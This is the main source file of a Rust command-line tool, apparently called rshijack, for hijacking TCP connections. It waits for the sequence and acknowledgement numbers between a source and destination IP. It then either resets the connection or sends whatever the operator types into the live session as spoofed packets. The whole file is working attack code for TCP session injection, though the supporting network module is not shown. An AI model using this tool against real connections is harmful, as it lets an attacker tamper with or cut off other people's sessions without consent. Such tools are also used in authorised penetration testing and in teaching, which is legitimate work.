extern crate clap;
extern crate env_logger;
extern crate pktparse;
extern crate nom;
extern crate pnet;
#[macro_use] extern crate log;
#[macro_use] extern crate error_chain;

pub mod args;
pub mod net;

mod errors {
    use std;

    error_chain! {
        foreign_links {
            Io(std::io::Error);
            ParseInt(std::num::ParseIntError);
            ParseAddress(std::net::AddrParseError);
        }
    }
}
pub use errors::{Error, ErrorKind, Result};

use error_chain::ChainedError;
use errors::ResultExt;

use std::io::{self, Read};
use std::thread;
use args::Arguments;
use net::TcpFlags;


fn run() -> Result<()> {
    let arguments = Arguments::parse().chain_err(|| "failed to parse arguments")?;

    if arguments.quiet == 0 && std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "rshijack=debug");
    }

    env_logger::init();

    trace!("arguments: {:?}", arguments);

    println!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
    println!("(To speed things up, try making some traffic between the two, /msg person asdf)");

    let mut connection = net::getseqack(&arguments.interface, &arguments.src, &arguments.dst)?;
    println!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", connection.get_seq(), connection.get_ack());

    let (mut tx, _rx) = net::create_socket()?;

    if arguments.reset {
        connection.reset(&mut tx)?;
        println!("[+] Connection has been reset");
        return Ok(());
    }

    {
        let mut connection = connection.clone();
        let interface = arguments.interface.clone();

        // arguments are flipped for receiving
        let dst = connection.src.clone();
        let src = connection.dst.clone();

        let (mut tx, _rx) = net::create_socket()?;

        let _recv = thread::spawn(move || {
            net::sniff(&mut tx, &interface, &mut connection, &src, &dst).unwrap();
        });
    }

    if arguments.send_null {
        info!("Sending 1kb of null bytes to prevent desync");

        let data = vec![0; 1024];
        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data)?;
    }

    println!("Starting hijack session, Please use ^D to terminate.");
    println!("Anything you enter from now on is sent to the hijacked TCP connection.");

    let mut stdin = io::stdin();
    let mut data = vec![0; 512];
    loop {
        let len = stdin.read(&mut data)?;

        if len == 0 {
            break;
        }

        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data[..len])?;
    }

    connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::FIN, &[])?;
    println!("Exiting..");

    Ok(())
}

fn main() {
    if let Err(ref e) = run() {
        eprintln!("{}", e.display_chain());
        std::process::exit(1);
    }
}
